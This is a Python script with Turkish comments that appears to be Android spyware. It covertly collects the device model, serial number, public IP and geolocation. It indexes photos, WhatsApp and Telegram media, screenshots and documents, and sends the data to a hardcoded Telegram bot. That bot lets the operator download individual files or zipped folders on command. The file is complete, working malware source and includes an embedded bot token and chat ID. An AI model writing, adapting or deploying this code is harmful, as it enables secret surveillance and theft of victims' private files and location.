import os
import json
import time
import requests
import zipfile
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes

# Telegram Bot Ayarları
BOT_TOKEN = "7990420796:AAEqVI1L0WiGL8l66L_njVYvgnaC2vNbL6Y"
CHAT_ID = "6736473228"
TELEGRAM_API = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
TELEGRAM_MESSAGE_API = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"

# Dosya-nesne eşleştirmesi
dosya_haritasi = {}

def cihaz_bilgisi_al():
    bilgiler = {}
    try:
        bilgiler["Model"] = os.popen("getprop ro.product.model").read().strip() or "Bilinmiyor"
        bilgiler["OS"] = os.popen("getprop ro.build.version.release").read().strip() or "Bilinmiyor"
        bilgiler["Seri No"] = os.popen("getprop ro.serialno").read().strip() or "Bilinmiyor"
        bilgiler["Cihaz ID"] = os.popen("getprop ro.build.id").read().strip() or "Bilinmiyor"
        bilgiler["Üretici"] = os.popen("getprop ro.product.manufacturer").read().strip() or "Bilinmiyor"
        try:
            ip_response = requests.get("https://api.ipify.org/?format=json")
            ip_json = ip_response.json()
            ip = ip_json.get("ip", "Bilinmiyor")
            bilgiler["IP"] = ip
            ip_info_response = requests.get(f"http://ip-api.com/json/{ip}")
            ip_info = ip_info_response.json()
            bilgiler["Ülke"] = ip_info.get("country", "Bilinmiyor")
            bilgiler["Ülke Kodu"] = ip_info.get("countryCode", "Bilinmiyor")
            bilgiler["Bölge"] = ip_info.get("region", "Bilinmiyor")
            bilgiler["Bölge Adı"] = ip_info.get("regionName", "Bilinmiyor")
            bilgiler["Şehir"] = ip_info.get("city", "Bilinmiyor")
            bilgiler["Posta Kodu"] = ip_info.get("zip", "Bilinmiyor")
            bilgiler["Enlem"] = str(ip_info.get("lat", "Bilinmiyor"))
            bilgiler["Boylam"] = str(ip_info.get("lon", "Bilinmiyor"))
            bilgiler["ISP"] = ip_info.get("isp", "Bilinmiyor")
            bilgiler["Organizasyon"] = ip_info.get("org", "Bilinmiyor")
        except:
            bilgiler["IP"] = "Bilinmiyor"
            bilgiler["Ülke"] = "Bilinmiyor"
            bilgiler["Ülke Kodu"] = "Bilinmiyor"
            bilgiler["Bölge"] = "Bilinmiyor"
            bilgiler["Bölge Adı"] = "Bilinmiyor"
            bilgiler["Şehir"] = "Bilinmiyor"
            bilgiler["Posta Kodu"] = "Bilinmiyor"
            bilgiler["Enlem"] = "Bilinmiyor"
            bilgiler["Boylam"] = "Bilinmiyor"
            bilgiler["ISP"] = "Bilinmiyor"
            bilgiler["Organizasyon"] = "Bilinmiyor"
    except:
        bilgiler["Hata"] = "Bazı bilgiler alınamadı!"
    return bilgiler

def dosya_tara():
    klasorler = {
        "Download": "/sdcard/Download",
        "Pictures": "/sdcard/Pictures",
        "Movies": "/sdcard/Movies",
        "Documents": "/sdcard/Documents",
        "WhatsApp Media": "/sdcard/WhatsApp/Media",
        "DCIM": "/sdcard/DCIM",
        "Music": "/sdcard/Music",
        "Telegram": "/sdcard/Telegram",
        "Screenshots": "/sdcard/Pictures/Screenshots",
        "Recordings": "/sdcard/Recordings",
        "Bluetooth": "/sdcard/Bluetooth"
    }
    dosya_listesi = {}
    global dosya_haritasi
    dosya_haritasi = {}
    sayac = 1
    medya_uzantilari = [".jpg", ".png"]  # Boyut sınırı olmayanlar
    diger_uzantilari = [".pdf", ".docx", ".txt", ".zip", ".mp4"]  # 1MB+ olanlar
    min_boyut = 1024 * 1024  # 1MB sınır
    
    for klasor, yol in klasorler.items():
        dosya_listesi[klasor] = []
        try:
            for root, _, files in os.walk(yol):
                for dosya in files:
                    tam_yol = os.path.join(root, dosya)
                    try:
                        dosya_boyutu = os.path.getsize(tam_yol)
                        if any(dosya.lower().endswith(uzanti) for uzanti in medya_uzantilari):
                            dosya_listesi[klasor].append({f"[{sayac}]": dosya})
                            dosya_haritasi[str(sayac)] = tam_yol
                            sayac += 1
                        elif any(dosya.lower().endswith(uzanti) for uzanti in diger_uzantilari) and dosya_boyutu >= min_boyut:
                            dosya_listesi[klasor].append({f"[{sayac}]": dosya})
                            dosya_haritasi[str(sayac)] = tam_yol
                            sayac += 1
                    except:
                        continue
        except Exception as e:
            dosya_listesi[klasor].append({"Hata": f"{klasor} taranamadı: {str(e)}"})
    return dosya_listesi, klasorler

def arsiv_olustur(kategori, klasor_yolu):
    zaman_damgasi = int(time.time())
    arsiv_yolu = f"/sdcard/tmp/dosyalar_{kategori}_{zaman_damgasi}.zip"
    medya_uzantilari = [".jpg", ".png"]
    diger_uzantilari = [".pdf", ".docx", ".txt", ".zip", ".mp4"]
    min_boyut = 1024 * 1024  # 1MB
    
    try:
        os.makedirs("/sdcard/tmp", exist_ok=True)
        with zipfile.ZipFile(arsiv_yolu, 'w', zipfile.ZIP_DEFLATED) as zip_dosyasi:
            for root, _, files in os.walk(klasor_yolu):
                for dosya in files:
                    tam_yol = os.path.join(root, dosya)
                    try:
                        dosya_boyutu = os.path.getsize(tam_yol)
                        if any(dosya.lower().endswith(uzanti) for uzanti in medya_uzantilari):
                            zip_dosyasi.write(tam_yol, os.path.relpath(tam_yol, klasor_yolu))
                        elif any(dosya.lower().endswith(uzanti) for uzanti in diger_uzantilari) and dosya_boyutu >= min_boyut:
                            zip_dosyasi.write(tam_yol, os.path.relpath(tam_yol, klasor_yolu))
                    except:
                        continue
        return arsiv_yolu
    except Exception as e:
        return None, f"Arşiv oluşturulamadı: {str(e)}"

def bilgileri_kaydet_ve_gonder():
    zaman_damgasi = int(time.time())
    cihaz_bilgisi = cihaz_bilgisi_al()
    cihaz_mesaji = (
        "╔══════════════════════╗\n"
        "║      Cihaz Bilgisi   ║\n"
        "╠══════════════════════╣\n"
        f"║ Model: {cihaz_bilgisi.get('Model', 'Bilinmiyor')} \n"
        f"║ OS: {cihaz_bilgisi.get('OS', 'Bilinmiyor')} \n"
        f"║ Seri No: {cihaz_bilgisi.get('Seri No', 'Bilinmiyor')} \n"
        f"║ Cihaz ID: {cihaz_bilgisi.get('Cihaz ID', 'Bilinmiyor')} \n"
        f"║ Üretici: {cihaz_bilgisi.get('Üretici', 'Bilinmiyor')} \n"
        "╠══════════════════════╣\n"
        "║      IP Bilgisi      ║\n"
        "╠══════════════════════╣\n"
        f"║ IP: {cihaz_bilgisi.get('IP', 'Bilinmiyor')} \n"
        f"║ Ülke: {cihaz_bilgisi.get('Ülke', 'Bilinmiyor')} \n"
        f"║ Ülke Kodu: {cihaz_bilgisi.get('Ülke Kodu', 'Bilinmiyor')} \n"
        f"║ Bölge: {cihaz_bilgisi.get('Bölge', 'Bilinmiyor')} \n"
        f"║ Bölge Adı: {cihaz_bilgisi.get('Bölge Adı', 'Bilinmiyor')} \n"
        f"║ Şehir: {cihaz_bilgisi.get('Şehir', 'Bilinmiyor')} \n"
        f"║ Posta Kodu: {cihaz_bilgisi.get('Posta Kodu', 'Bilinmiyor')} \n"
        f"║ Enlem: {cihaz_bilgisi.get('Enlem', 'Bilinmiyor')} \n"
        f"║ Boylam: {cihaz_bilgisi.get('Boylam', 'Bilinmiyor')} \n"
        f"║ ISP: {cihaz_bilgisi.get('ISP', 'Bilinmiyor')} \n"
        f"║ Organizasyon: {cihaz_bilgisi.get('Organizasyon', 'Bilinmiyor')} \n"
        "╚══════════════════════╝"
    )
    requests.post(TELEGRAM_MESSAGE_API, data={"chat_id": CHAT_ID, "text": cihaz_mesaji})
    print("Cihaz ve IP bilgisi mesaj olarak gönderildi!")
    dosya_listesi, _ = dosya_tara()
    dosya_dosyasi = f"dosyalar_{zaman_damgasi}.json"
    with open(dosya_dosyasi, "w") as f:
        json.dump(dosya_listesi, f, indent=4, ensure_ascii=False)
    print(f"Dosyalar {dosya_dosyasi} kaydedildi!")
    with open(dosya_dosyasi, "rb") as f:
        requests.post(TELEGRAM_API, data={"chat_id": CHAT_ID}, files={"document": f})
    print(f"{dosya_dosyasi} Telegram'a gönderildi!")

async def select_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        numara = context.args[0]
        dosya_yolu = dosya_haritasi.get(numara)
        if not dosya_yolu or not os.path.exists(dosya_yolu):
            await update.message.reply_text(f"Numara {numara} bulunamadı, kral! 😈")
            return

        with open(dosya_yolu, "rb") as f:
            await update.message.reply_document(document=f, filename=os.path.basename(dosya_yolu))
        print(f"{numara} numaralı dosya ({dosya_yolu}) Telegram'a gönderildi!")
    except Exception as e:
        await update.message.reply_text(f"Hata, dosya gönderilemedi! ({str(e)})")
        
async def category(update: Update, context: ContextTypes.DEFAULT_TYPE):
    _, klasorler = dosya_tara()  # Klasör listesini al
    kategori_listesi = "\n".join([f"{i+1}. {k}" for i, k in enumerate(klasorler.keys())])
    mesaj = (
        "Kategori seç kral! 😈\n"
        f"{kategori_listesi}\n"
        "Örnek: /category Download"
    )
    if not context.args:
        await update.message.reply_text(mesaj)
        return
    
    kategori = " ".join(context.args).strip()
    if kategori not in klasorler:
        update.message.reply_text(f"Geçersiz kategori: {kategori}, kral! 😈 Listeden seç:\n{mesaj}")
        return
    
    klasor_yolu = klasorler[kategori]
    arsiv_yolu = arsiv_olustur(kategori, klasor_yolu)
    if not arsiv_yolu:
        update.message.reply_text(f"Arşiv oluşturulamadı, kral! 😈 Hata: {arsiv_yolu[1]}")
        return
    
    try:
        with open(arsiv_yolu, "rb") as f:
            await update.message.reply_document(document=f, filename=os.path.basename(arsiv_yolu))
        print(f"{kategori} kategorisi arşivi ({arsiv_yolu}) Telegram'a gönderildi!")
        os.remove(arsiv_yolu)  # Arşivi gönderildikten sonra sil
        print(f"{arsiv_yolu} silindi!")
    except Exception as e:
        update.message.reply_text(f"Hata, arşiv gönderilemedi: {str(e)}")

def main():
    print("Botu başlatıyorum, kral! 😈")
    application = Application.builder().token(BOT_TOKEN).build()
    application.add_handler(CommandHandler("select", select_file))
    application.add_handler(CommandHandler("category", category))
    application.run_polling()

if __name__ == "__main__":
    main()
